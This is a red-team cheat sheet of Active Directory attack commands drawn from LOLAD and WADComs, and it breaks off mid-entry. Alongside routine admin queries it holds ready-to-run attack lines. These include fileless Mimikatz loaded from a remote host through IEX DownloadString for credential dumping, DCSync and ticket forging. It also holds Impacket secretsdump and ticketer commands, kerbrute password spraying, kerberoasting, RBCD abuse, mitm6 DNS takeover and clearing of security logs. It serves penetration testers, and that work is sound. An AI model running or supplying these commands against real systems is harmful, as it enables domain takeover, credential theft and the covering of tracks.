# Active Directory Attacks
> Source: LOLAD, WADComs | Entries: 237 | Platform: windows


## Index

- [active_directory](#activedirectory)
- [DCOM](#dcom)
- [Discovery](#discovery)
- [DNS](#dns)
- [Enumeration](#enumeration)
- [Kerberos](#kerberos)
- [LDAP](#ldap)
- [No_Creds](#nocreds)
- [NTLM](#ntlm)
- [PowerShell](#powershell)
- [RPC](#rpc)
- [Shell](#shell)
- [SMB](#smb)
- [Username](#username)
- [WMI](#wmi)


### active_directory

#### Check Active Directory Replication Queue
Command: repadmin /queue; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Check AD Replication Status
Command: repadmin /replsummary; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Check AutoStart Programs
Command: reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run; Type: CMD; Reference: HackTricks - Registry Pe...
**Categories:** active_directory

#### Check Domain Admin Account Status
Command: Get-ADUser -Filter {MemberOf -RecursiveMatch 'Domain Admins'} | Select-Object Name, Enabled; Type: PowerShel...
**Categories:** active_directory

#### Check Domain Controller Certificates
Command: certutil -dcinfo verify; Type: CMD; Reference: PowerShell Red Team
**Categories:** active_directory

#### Check Domain Controller Synchronization Status
Command: repadmin /showrepl; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Check Domain Controllers Replication Status
Command: Get-ADReplicationPartnerMetadata -Target "DC=domain,DC=com"; Type: PowerShell; Reference: Microsoft Document...
**Categories:** active_directory

#### Check Domain Group Membership
Command: net group "GroupName" /domain; Type: CMD; Reference: CBT Nuggets - AD Commands
**Categories:** active_directory

#### Check Domain Policies with PowerView
Command: Get-DomainPolicy; Type: PowerShell (PowerView); Reference: PowerSploit - PowerView
**Categories:** active_directory

#### Check for Kerberos Pre-Authentication Disabled Accounts
Command: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name, SamAccountName; Type: PowerShell; Refere...
**Categories:** active_directory

#### Check Group Policy for Computer
Command: gpresult /r /scope computer; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Check Group Policy Objects (GPOs)
Command: Get-GPO -All; Type: PowerShell; Reference: Active Directory Pro
**Categories:** active_directory

#### Check if Machine is a Domain Controller
Command: if ((Get-ADComputer -Identity "ComputerName").PrimaryGroupID -eq 516) { "Domain Controller" }; Type: PowerSh...
**Categories:** active_directory

#### Check Kerberos Ticket Policy
Command: Get-ADDefaultDomainPasswordPolicy | Select-Object -ExpandProperty KerberosTicketPolicy; Type: PowerShell; Re...
**Categories:** active_directory

#### Check Last Logon Time for All Users
Command: Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -ne $null} | Select-Object N...
**Categories:** active_directory

#### Check LDAP Server Status
Command: nltest /dsgetdc:domain /ldaponly; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Check Registry Keys for Persistence
Command: reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run; Type: CMD; Reference: SS64 - Reg Command
**Categories:** active_directory

#### Check User Account Lockout Status
Command: Get-ADUser -Filter * -Properties LockedOut | Where-Object {$_.LockedOut -eq $true}; Type: PowerShell; Refere...
**Categories:** active_directory

#### Check Writable Registry Paths with PowerUp
Command: Invoke-AllChecks | Select-Object WritableRegPaths; Type: PowerShell (PowerUp); Reference: PowerSploit - PowerUp
**Categories:** active_directory

#### Clear Security Event Logs
Command: Clear-EventLog -LogName Security; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Collect Domain SID
Command: Get-ADDomain | Select-Object SID; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Dump Cached Domain Credentials (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Dump Credentials from Memory (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Dump Domain Credentials using DCSync (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Dump Domain Hashes with SecretsDump
Command: secretsdump.py domain/username:password@target; Type: Python (Impacket); Reference: Impacket - SecretsDump
**Categories:** active_directory

#### Enable Remote Desktop (RDP)
Command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;...
**Categories:** active_directory

#### Enable Remote Desktop (RDP)
Command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;...
**Categories:** active_directory

#### Enumerate All Forest Trusts
Command: Get-ADTrust -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate All GPOs Linked to OU
Command: Get-GPLink -Domain domain.local -Target "OU=ExampleOU,DC=domain,DC=local"; Type: PowerShell; Reference: Micr...
**Categories:** active_directory

#### Enumerate All Organizational Units (OUs)
Command: Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName; Type: PowerShell; Reference: Mic...
**Categories:** active_directory

#### Enumerate All Registry Keys
Command: reg query HKLM; Type: CMD; Reference: SS64 - Reg Command
**Categories:** active_directory

#### Enumerate DNS Servers
Command: Get-DnsServer | Select-Object Name, IPAddress; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate Domain Admins
Command: Get-ADGroupMember -Identity "Domain Admins" | Select Name, SamAccountName, ObjectClass; Type: PowerShell; Re...
**Categories:** active_directory

#### Enumerate Domain Forest
Command: Get-ADForest; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate Domain Groups
Command: Get-ADGroup -Filter * | Select-Object Name; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate Domain Trusts with PowerView
Command: Get-NetDomainTrust; Type: PowerShell (PowerView); Reference: Medium - AD Enumeration
**Categories:** active_directory

#### Enumerate Domain Users
Command: Get-ADUser -Filter * | Select-Object Name, SamAccountName; Type: PowerShell; Reference: AD Exploitation Chea...
**Categories:** active_directory

#### Enumerate Domain Users (LDAP)
Command: dsquery user -name *; Type: CMD; Reference: Active Directory Pro
**Categories:** active_directory

#### Enumerate Global Catalog Servers
Command: nltest /dsgetdc:/gc; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate Group Policy Objects (GPO)
Command: Get-GPO -All | Select-Object DisplayName, GpoStatus; Type: PowerShell; Reference: PowerShell Red Team
**Categories:** active_directory

#### Enumerate Local Admins on All Domain Machines with PowerView
Command: Invoke-EnumerateLocalAdmin -ComputerName target-machine; Type: PowerShell (PowerView); Reference: PowerSploi...
**Categories:** active_directory

#### Enumerate Password Policies
Command: Get-ADFineGrainedPasswordPolicy; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Enumerate Trusted Domains
Command: nltest /trusted_domains; Type: CMD; Reference: GitHub - AD Pentest
**Categories:** active_directory

#### Export All Group Policy Objects
Command: Backup-GPO -All -Path "C:\GPOBackups"; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Export Registry Hive
Command: reg export HKLM\Software\MyKey mykey.reg; Type: CMD; Reference: SS64 - Reg Export Command
**Categories:** active_directory

#### Extract Kerberos Ticket (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Find Active Directory Sites
Command: Get-ADReplicationSite -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Find Admin Accounts
Command: dsquery user -name *admin*; Type: CMD; Reference: HackTricks - AD Methodology
**Categories:** active_directory

#### Find All Sessions on a Computer
Command: quser /server:ComputerName; Type: CMD; Reference: Quser Command
**Categories:** active_directory

#### Find Computers with LAPS Enabled
Command: Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=com"; Type: PowerShell; Reference: Microso...
**Categories:** active_directory

#### Find DC Site Information
Command: nltest /dsgetsite; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Find Domain Admins with PowerView
Command: Get-NetGroup -GroupName "Domain Admins" | Get-NetGroupMember; Type: PowerShell (PowerView); Reference: Power...
**Categories:** active_directory

#### Find Domain Password Policy Settings
Command: net accounts /domain; Type: CMD; Reference: Active Directory Pro
**Categories:** active_directory

#### Find High-Value Targets (e.g., Admins with SPN)
Command: Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and MemberOf -like "*Domain Admins*"} | Select Name, S...
**Categories:** active_directory

#### Find Local Administrators on a Machine
Command: net localgroup Administrators; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Find Local Admins on Remote Machine
Command: net localgroup Administrators /domain; Type: CMD; Reference: SS64 - Net Localgroup Command
**Categories:** active_directory

#### Find Local Privilege Escalation Paths with PowerUp
Command: Invoke-AllChecks; Type: PowerShell (PowerUp); Reference: PowerSploit - PowerUp
**Categories:** active_directory

#### Find Machines with Unconstrained Delegation
Command: Get-ADComputer -Filter {TrustedForDelegation -eq $true}; Type: PowerShell; Reference: PowerShell Red Team
**Categories:** active_directory

#### Find Sensitive Account Delegations
Command: Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object Name, SamAccountName; Type: PowerShell;...
**Categories:** active_directory

#### Find SID History for Users (SID History Abuse)
Command: Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory}; Type: PowerShell; Reference: AD...
**Categories:** active_directory

#### Find Users with Expired Passwords
Command: Search-ADAccount -PasswordExpired | Select-Object Name, SamAccountName; Type: PowerShell; Reference: Microso...
**Categories:** active_directory

#### Find Weak File Permissions with PowerUp
Command: Invoke-CheckLocalAdminAccess; Type: PowerShell (PowerUp); Reference: PowerSploit - PowerUp
**Categories:** active_directory

#### Force Group Policy Update
Command: gpupdate /force; Type: CMD; Reference: SS64 - Gpupdate Command
**Categories:** active_directory

#### Get AD DNS Zone Information
Command: Get-DnsServerZone; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Get AD Domain Sites and Subnets
Command: Get-ADReplicationSite | Select-Object Name, SiteObjectGUID; Type: PowerShell; Reference: Microsoft Documenta...
**Categories:** active_directory

#### Get All Subnets in the Forest
Command: Get-ADReplicationSubnet -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Get Domain Controllers
Command: Get-ADDomainController -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Get Domain Forest Information
Command: Get-ADForest; Type: PowerShell; Reference: CBT Nuggets - Common AD Commands
**Categories:** active_directory

#### Get Domain Functional Level
Command: Get-ADDomain | Select-Object DomainMode; Type: PowerShell; Reference: HackTricks - AD Methodology
**Categories:** active_directory

#### Get Domain Information
Command: Get-ADDomain; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Get Domain Password Expiration Policy
Command: net accounts /domain; Type: CMD; Reference: HackTheBox - AD Pentesting Guide
**Categories:** active_directory

#### Get Domain Password Policy
Command: Get-ADDefaultDomainPasswordPolicy; Type: PowerShell; Reference: PowerShell Red Team
**Categories:** active_directory

#### Get Domain Users Last Logon Time
Command: Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate; Type: PowerShell; Reference: Me...
**Categories:** active_directory

#### Get Domain Users with Expired Passwords
Command: Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired; Type: PowerShell; Reference: HackTh...
**Categories:** active_directory

#### Get LAPS-Enabled Computers
Command: Find-AdmPwdExtendedRights -Identity "OU=Computers,DC=domain,DC=com"; Type: PowerShell (LAPS); Reference: Mic...
**Categories:** active_directory

#### Get Password Policy of Domain
Command: Get-ADDefaultDomainPasswordPolicy; Type: PowerShell; Reference: Active Directory Pro
**Categories:** active_directory

#### Golden Ticket Attack (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Identify Accounts with SPNs (Kerberoasting)
Command: Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName; Type: PowerShell; Re...
**Categories:** active_directory

#### Identify Admin Accounts with Password Never Expire
Command: Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1} | Select-Object Name; Type: PowerS...
**Categories:** active_directory

#### Identify all GPO Permissions for a User
Command: Get-GPPermission -All -User "UserName" | Select-Object DisplayName, Permission; Type: PowerShell; Reference:...
**Categories:** active_directory

#### Identify Computers with Unconstrained Delegation
Command: Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name, DNSHostName; Type: PowerShell;...
**Categories:** active_directory

#### Identify Domain Admins Group Members
Command: Get-ADGroupMember -Identity "Domain Admins"; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Identify Expired Accounts
Command: Search-ADAccount -AccountExpired | Select-Object Name, Enabled; Type: PowerShell; Reference: AD Exploitation...
**Categories:** active_directory

#### Identify Expired Passwords
Command: Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired; Type: PowerShell; Reference: Pentes...
**Categories:** active_directory

#### Identify Interesting ACLs with PowerView
Command: Find-InterestingDomainAcl; Type: PowerShell (PowerView); Reference: PowerSploit - PowerView
**Categories:** active_directory

#### Identify Local Administrators with PowerUp
Command: Get-LocalGroupMember -Group "Administrators"; Type: PowerShell; Reference: PowerSploit - PowerUp
**Categories:** active_directory

#### Identify Members of Domain Admins
Command: Get-ADGroupMember -Identity "Domain Admins"; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Identify Users with Delegation Privileges
Command: Get-ADUser -Filter {TrustedForDelegation -eq $true}; Type: PowerShell; Reference: PowerShell Red Team
**Categories:** active_directory

#### Import PowerUp Module
Command: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerUp.ps1'); Invoke-AllC...
**Categories:** active_directory

#### Import PowerView Module
Command: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1'); Get-NetUs...
**Categories:** active_directory

#### List Active Directory Sites
Command: Get-ADReplicationSite -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List AD Sites
Command: Get-ADReplicationSite -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List AD Users with Details
Command: Get-ADUser -Filter * -Properties DisplayName, EmailAddress, LastLogonDate; Type: PowerShell; Reference: Micr...
**Categories:** active_directory

#### List All Active Directory Sites
Command: Get-ADReplicationSite -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List All Computers in Domain
Command: Get-ADComputer -Filter *; Type: PowerShell; Reference: Active Directory Pro
**Categories:** active_directory

#### List All Disabled Accounts in Domain
Command: Search-ADAccount -AccountDisabled | Select-Object Name, SamAccountName; Type: PowerShell; Reference: Microso...
**Categories:** active_directory

#### List all Domain Computers
Command: Get-ADComputer -Filter * | Select-Object Name, OperatingSystem; Type: PowerShell; Reference: Medium - AD Enu...
**Categories:** active_directory

#### List All Domain Groups and Membership Counts
Command: Get-ADGroup -Filter * | ForEach-Object {Write-Output "$($_.Name): $((Get-ADGroupMember -Identity $_.Name).Co...
**Categories:** active_directory

#### List All Domain Groups and Their Members
Command: Get-ADGroup -Filter * | ForEach-Object {Get-ADGroupMember -Identity $_.Name | Select Name, SamAccountName};...
**Categories:** active_directory

#### List All Domains with PowerView
Command: Get-NetDomain; Type: PowerShell (PowerView); Reference: HackTricks - AD Methodology
**Categories:** active_directory

#### List All Group Policies in Domain
Command: Get-GPO -All; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List All Kerberos Tickets in Cache
Command: klist; Type: CMD; Reference: Klist Command
**Categories:** active_directory

#### List All Members of a Specific OU
Command: Get-ADUser -SearchBase "OU=Users,DC=domain,DC=com" -Filter * | Select Name, SamAccountName; Type: PowerShell...
**Categories:** active_directory

#### List All Organizational Units (OUs)
Command: Get-ADOrganizationalUnit -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List all Service Accounts
Command: Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Select Name, ServicePrincipalName; Type: PowerShell;...
**Categories:** active_directory

#### List All Sessions on Domain Machines with PowerView
Command: Get-NetSession -ComputerName target-machine; Type: PowerShell (PowerView); Reference: Pentest Everything - A...
**Categories:** active_directory

#### List All Users in the Domain
Command: net user /domain; Type: CMD; Reference: Active Directory Pro
**Categories:** active_directory

#### List Applied GPOs for Computer
Command: gpresult /R /SCOPE COMPUTER; Type: CMD; Reference: SS64 - Gpresult Command
**Categories:** active_directory

#### List Delegated Admins on Specific OU
Command: Get-ACL "OU=TestOU,DC=domain,DC=com" | Format-List; Type: PowerShell; Reference: Medium - AD Enumeration
**Categories:** active_directory

#### List Domain Controllers
Command: nltest /dclist:domain; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### List Domain Groups
Command: Get-ADGroup -Filter * | Select-Object Name; Type: PowerShell; Reference: Medium - AD Enumeration
**Categories:** active_directory

#### List Local Administrators on Remote System
Command: net localgroup Administrators /domain; Type: CMD; Reference: Net Localgroup Command
**Categories:** active_directory

#### List Machines with High Privileges
Command: Get-ADComputer -Filter {PrimaryGroupID -eq 512}; Type: PowerShell; Reference: Medium - AD Enumeration
**Categories:** active_directory

#### List Open File Shares on Domain Machines
Command: net view \\target-machine; Type: CMD; Reference: Exploit-DB - AD Enumeration
**Categories:** active_directory

#### List Open Shares on Remote Computer
Command: net view \\ComputerName /all; Type: CMD; Reference: Net View Command
**Categories:** active_directory

#### List Organizational Units (OUs)
Command: Get-ADOrganizationalUnit -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### List Privileged Accounts in Domain
Command: Get-ADUser -Filter {AdminCount -eq 1} | Select-Object Name, SamAccountName; Type: PowerShell; Reference: Med...
**Categories:** active_directory

#### List Privileged Groups
Command: net group "Domain Admins" /domain; Type: CMD; Reference: HackTheBox - AD Pentesting Guide
**Categories:** active_directory

#### List Privileges for a Specific Group
Command: Get-ADGroupMember -Identity "Enterprise Admins" | Select Name, SamAccountName; Type: PowerShell; Reference:...
**Categories:** active_directory

#### List Service Principal Names (SPNs)
Command: Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Select-Object Name, ServicePrincipalName; Type: Powe...
**Categories:** active_directory

#### List Sessions on a Domain Controller
Command: qwinsta /server:DomainControllerName; Type: CMD; Reference: Qwinsta Command
**Categories:** active_directory

#### List User Rights Assignments
Command: Get-GPResultantSetOfPolicy -User domain\username -ReportType Html -Path C:\gporeport.html; Type: PowerShell;...
**Categories:** active_directory

#### List Users in Specific Group
Command: Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName; Type: PowerShell; Referenc...
**Categories:** active_directory

#### Modify Registry Key Permissions
Command: reg add HKLM\Software\ExampleKey /v ExampleValue /t REG_SZ /d "ExampleData" /f; Type: CMD; Reference: SS64 -...
**Categories:** active_directory

#### Pass-the-Hash Attack (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Pass-the-Hash Attack on Local Account
Command: sekurlsa::pth /user:LocalUser /domain:localhost /ntlm:/run:powershell.exe; Type: Mimikatz; Reference: HackTr...
**Categories:** active_directory

#### Pass-the-Ticket Attack (Fileless)
Command: Dump Kerberos tickets in memory:IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimika...
**Categories:** active_directory

#### Query Active Directory Replication Partners
Command: repadmin /showrepl; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Query all Domain Services
Command: nltest /dsgetdc:domain; Type: CMD; Reference: Medium - AD Enumeration with PowerShell
**Categories:** active_directory

#### Query DNS Servers in Domain
Command: Get-DnsServerResourceRecord -ZoneName "domain.local"; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### Query Domain Controllers in Domain
Command: nltest /dclist:domain; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Query Domain Forest Global Catalog
Command: nltest /gc; Type: CMD; Reference: Microsoft Documentation
**Categories:** active_directory

#### Run Mimikatz as Admin (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### Search for Kerberoastable Accounts with PowerView
Command: Get-NetUser -SPN | Select-Object servicePrincipalName; Type: PowerShell (PowerView); Reference: PowerSploit...
**Categories:** active_directory

#### Silver Ticket Attack (Fileless)
Command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Comma...
**Categories:** active_directory

#### View All Replication Subnets
Command: Get-ADReplicationSubnet -Filter *; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

#### View Security Event Logs
Command: Get-EventLog -LogName Security -Newest 100; Type: PowerShell; Reference: Microsoft Documentation
**Categories:** active_directory

### DCOM

#### Impacket-DCOMExec
Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCO...
**Categories:** DCOM, Exploitation
```
python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1

```

### Discovery

#### Powershell-ADModule-enum
The Active Directory Module from powershell can be used to preform most needed enumaration tasks as well as some expl...
**Categories:** Discovery, Credential Access
```
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

```

### DNS

#### Mitm6
mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It...
**Categories:** DNS, Exploitation
```
mitm6 -d test.local --ignore-nofqnd

```

### Enumeration

#### PwshADmodule-Initial-Enum
These commands provide a quick refernece for using the AD module to get situational awerness of the AD environment.
N...
**Categories:** Enumeration
```
#Getting all DCs in the forest
(Get-ADForest).Domains | % { Get-ADDomainController -DomainName $_ -Discover }

#Getting all users in the forest
(Get-ADForest).Domains | % { Get-ADUser -Filter * -Server $_ }

#Getting all computers in the forest
(Get-ADForest).Domains | % { Get-ADComputer -Filter * -Server $_ }

#Mapping out entire trust relationships
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' | Select-Object Source,Target,Name

#Getting all groups in a domain. Note that the select statement will limit the output to only the matching fields the object contains
Get-ADGroup -Filter * | Select-Object SamAccountName, GroupScope, DistinguishedName

```

### Kerberos

#### Impacket-GetADUsers
Impacket's GetADUsers.py will attempt to gather data about the domain's users and their corresponding email addresses...
**Categories:** Kerberos, Enumeration
```
python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1

```

#### Impacket-GetNPUsers
Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. Thes...
**Categories:** Kerberos, Exploitation
```
python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt

```

#### Impacket-getST-Creds
Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation pr...
**Categories:** Kerberos, Exploitation, PrivEsc, Persistence
```
python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123

```

#### Impacket-getST-Hash
Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation pr...
**Categories:** Kerberos, Exploitation, PrivEsc, Persistence
```
python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john

```

#### Impacket-getTGT
Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or mac...
**Categories:** Kerberos, Exploitation
```
python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7

```

#### Impacket-GetUserSPNs
Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts...
**Categories:** Kerberos, Exploitation
```
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request

```

#### Impacket-GoldenTicket
Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM h...
**Categories:** Kerberos, Exploitation, Persistence
```
python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john

```

#### Impacket-RBCD
Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security...
**Categories:** Kerberos, SMB, LDAP, Exploitation, PrivEsc, Persistence
```
python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john

```

#### Impacket-SecretsDump
Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing a...
**Categories:** Kerberos, NTLM, Exploitation
```
python3 secretsdump.py test.local/john:password123@10.10.10.1

```

#### Impacket-SecretsDump-NTDS
Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing a...
**Categories:** Kerberos, NTLM, Exploitation
```
python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2

```

#### Impacket-SilverTicket
Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service usin...
**Categories:** Kerberos, Exploitation, Persistence
```
python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john

```

#### Kerbrute-BruteForce
ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The...
**Categories:** Kerberos, Enumeration
```
cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -

```

#### Kerbrute-BruteUser
ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The...
**Categories:** Kerberos, Enumeration
```
kerbrute bruteuser -d test.local passwords.txt john

```

#### Kerbrute-PasswordSpray
ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The...
**Categories:** Kerberos, Enumeration
```
kerbrute passwordspray -d test.local domain_users.txt password123

```

#### Kerbrute-UserEnum
ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The...
**Categories:** Kerberos, Enumeration
```
kerbrute userenum -d test.local usernames.txt

```

#### lsassy-credsdump
"lsassy is a tool written in python released in 2021 to provide a varity of methods to dump credintials from a single...
**Categories:** Kerberos, NTLM, Exploitation
```
lsassy -u john -p password123 -d test.local 10.10.10.1

```

#### Nmap-Krb5-Enum-Users
Nmap's `krb5-enum-users` script attempts to bruteforce and enumerate valid Active Directory accounts through Kerberos...
**Categories:** Kerberos, Enumeration, Enumeration
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1

```

#### PKINIT-getnthash
PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn conta...
**Categories:** Kerberos, Exploitation, PrivEsc
```
KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773

```

#### PKINIT-gettgtpkinit
PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cer...
**Categories:** Kerberos, Exploitation, PrivEsc
```
python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache

```

#### PSADmodule-Kerbaroasting
Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and then attempting to crack...
**Categories:** Kerberos, Exploitation
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output "===== $account : $spn =====`n$ticketBase64" } | Out-File -FilePath "kerberos_tickets.txt" -Encoding ASCII

```

#### PyWhisker
pyWhisker is a tool allowing users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to ob...
**Categories:** Kerberos, Exploitation
```
python3 pywhisker.py -d "test.local" -u "john" -p "password123" --target "user2" --action "list" --dc-ip "10.10.10.1"

```

#### Rubeus-AskTGT
Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or...
**Categories:** Kerberos, Exploitation
```
Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

```

#### Rubeus-ASREPRoast
Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. T...
**Categories:** Kerberos, Exploitation, PrivEsc
```
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

```

#### Rubeus-Brute
Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication...
**Categories:** Kerberos, Enumeration
```
